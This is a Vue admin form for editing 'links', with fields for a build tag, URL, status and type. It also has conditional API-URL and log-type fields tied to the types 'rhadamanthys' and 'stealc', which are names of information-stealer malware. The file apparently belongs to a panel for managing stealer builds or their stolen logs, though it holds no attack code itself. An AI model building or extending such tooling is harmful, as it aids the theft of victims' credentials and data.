<template>
    <Head title="Edit Link" />

    <AdminLayout>
        <div class="mx-auto max-w-3xl">
            <h1 class="text-2xl font-bold text-gray-800 mb-6 flex items-center">
                <GoBack :href="route('admin.links.index')" class="mr-2" />
                Edit Link
            </h1>

            <form @submit.prevent="submit" class="bg-white p-6 shadow-lg rounded-lg space-y-6">

                <!-- Name & Build Tag -->
                <div class="flex flex-col sm:flex-row gap-4">
                    <div class="flex-1">
                        <label for="name" class="block text-sm font-medium text-gray-700">Name</label>
                        <input v-model="form.name" id="name" type="text"
                            class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500" />
                        <p v-if="form.errors.name" class="text-red-600 text-sm mt-1">{{ form.errors.name }}</p>
                    </div>
                    <div class="flex-1">
                        <label for="build_tag" class="block text-sm font-medium text-gray-700">Build Tag</label>
                        <input v-model="form.build_tag" id="build_tag" type="text"
                            class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500" />
                        <p v-if="form.errors.build_tag" class="text-red-600 text-sm mt-1">{{ form.errors.build_tag }}</p>
                    </div>
                </div>

                <!-- URL -->
                <div>
                    <label for="url" class="block text-sm font-medium text-gray-700">URL</label>
                    <textarea v-model="form.url" id="url"
                        class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500"></textarea>
                    <p v-if="form.errors.url" class="text-red-600 text-sm mt-1">{{ form.errors.url }}</p>
                </div>

                <!-- Type & Status -->
                <div class="flex flex-col sm:flex-row gap-4">
                    <div class="flex-1">
                        <label for="type" class="block text-sm font-medium text-gray-700">Type</label>
                        <select v-model="form.type" id="type"
                            class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500">
                            <option value="a">A</option>
                            <option value="b">B</option>
                            <option value="c">C</option>
                            <option value="d">D</option>
                        </select>
                        <p v-if="form.errors.type" class="text-red-600 text-sm mt-1">{{ form.errors.type }}</p>
                    </div>
                    <div class="flex-1">
                        <label for="status" class="block text-sm font-medium text-gray-700">Status</label>
                        <select v-model="form.status" id="status"
                            class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500">
                            <option value="active">Active</option>
                            <option value="inactive">Inactive</option>
                        </select>
                        <p v-if="form.errors.status" class="text-red-600 text-sm mt-1">{{ form.errors.status }}</p>
                    </div>
                </div>

                <!-- API URL (Conditional) -->
                <div v-if="form.type === 'rhadamanthys' || form.type === 'stealc'">
                    <label for="api_url" class="block text-sm font-medium text-gray-700">API URL</label>
                    <textarea v-model="form.api_url" id="api_url"
                        class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500"></textarea>
                    <p v-if="form.errors.api_url" class="text-red-600 text-sm mt-1">{{ form.errors.api_url }}</p>
                </div>

                <!-- Base Logs Type (Conditional) -->
                <div v-if="form.type === 'rhadamanthys'">
                    <label for="base_logs_type" class="block text-sm font-medium text-gray-700">Base Logs Type</label>
                    <select v-model="form.base_logs_type" id="base_logs_type"
                        class="mt-1 w-full border border-gray-300 rounded-md p-2 focus:ring-blue-500 focus:border-blue-500">
                        <option value="log">Logs</option>
                        <option value="detailed_log">Detailed Logs</option>
                    </select>
                    <p v-if="form.errors.base_logs_type" class="text-red-600 text-sm mt-1">{{ form.errors.base_logs_type }}</p>
                </div>

                <!-- Buttons -->
                <div class="flex flex-col sm:flex-row gap-4 pt-2">
                    <button type="submit"
                        class="px-4 py-2 bg-blue-600 text-white font-semibold text-sm rounded-md hover:bg-blue-700 transition">
                        Save Changes
                    </button>
                    <Link :href="route('admin.links.index')"
                        class="px-4 py-2 bg-gray-600 text-white text-sm font-semibold rounded-md hover:bg-gray-700 text-center transition">
                        Cancel
                    </Link>
                </div>
            </form>
        </div>
    </AdminLayout>
</template>

<script setup>
import GoBack from '@/Components/GoBack.vue';
import AdminLayout from '@/Layouts/AdminLayout.vue';
import { Head, useForm, usePage, Link } from '@inertiajs/vue3';

const { props } = usePage();
const link = props.link;

const form = useForm({
    name: link.name,
    build_tag: link.build_tag,
    url: link.url,
    type: link.type,
    status: link.status,
    api_url: link.api_url,
    base_logs_type: link.base_logs_type,
});

const submit = () => {
    form.put(route('admin.links.update', link.id));
};
</script>